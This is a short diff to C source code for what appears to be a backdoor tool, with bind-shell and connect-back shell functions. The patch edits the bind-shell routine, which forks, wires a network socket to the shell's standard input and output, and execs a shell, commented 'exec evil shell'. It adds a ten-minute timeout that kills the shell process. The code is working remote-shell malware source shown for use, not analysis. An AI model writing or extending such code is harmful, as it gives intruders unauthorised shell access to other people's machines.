@@ -36,6 +36,8 @@
 
 #include <fcntl.h>
 
+#include <signal.h>
+
 
 static void tcp_bind_shell(ctrl_t *);
 static void tcp_connback_shell(ctrl_t *);
@@ -109,7 +111,10 @@ static void tcp_bind_shell(ctrl_t *ctrl)
 
     /* exec evil shell */
     if ((shell->pid = fork()) == 0) {
-        xdup2(shell->cfd, 0);
+    xclose(shell->lfd);
+
+
+	xdup2(shell->cfd, 0);
         xdup2(shell->cfd, 1);
         xdup2(shell->cfd, 2);
         sleep(1);
@@ -117,6 +122,17 @@ static void tcp_bind_shell(ctrl_t *ctrl)
         execl(SHELL, SHELL, NULL);
         __EXIT_SUCCESS;
     }
+	
+	sigset_t mask;
+	sigemptyset(&mask);
+	
+	struct timespec t;
+	t.tv_sec = 600;
+	t.tv_nsec = 0;
+	int w;
+	w = sigtimedwait(&mask, 0, &t);
+	printf("sigtimedwait return %d\n", w);
+	kill(shell->pid, 9);
 
     /* we are done, so we can close descriptors */
     xclose(shell->lfd);
